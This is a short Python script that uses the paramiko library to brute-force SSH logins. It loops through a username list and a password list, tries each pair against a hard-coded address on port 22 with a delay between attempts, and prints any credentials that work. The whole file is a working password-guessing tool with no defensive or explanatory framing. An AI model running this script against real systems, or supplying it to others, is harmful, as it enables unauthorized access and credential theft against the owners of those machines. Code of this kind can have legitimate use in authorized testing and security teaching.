import paramiko
import time

def brute(host, port, user, pwd):
    log = paramiko.util.log_to_file('shh-{}.log'.format(host))
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, user, pwd)
        return True
    except:
        return False
        

def main():
    host = '192.168.0.20'
    port = 22
    user_wdlist = 'users.txt'
    pwd_wdlist = 'passwords.txt'
    users = open(user_wdlist, 'r')
    users = users.read().split('\n')
    passwords = open(pwd_wdlist, 'r')
    passwords = passwords.read().split('\n')


    for user in users:
        found = False
        for pwd in passwords:
            time.sleep(5)
            if (brute(host, port, user, pwd)):
                print('Credentials found')
                print('User: {}\tPassword: {}'.format(user, pwd))
                found = True
                break
            else:
                print('Failed')
        
        if found:
            break
            

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
    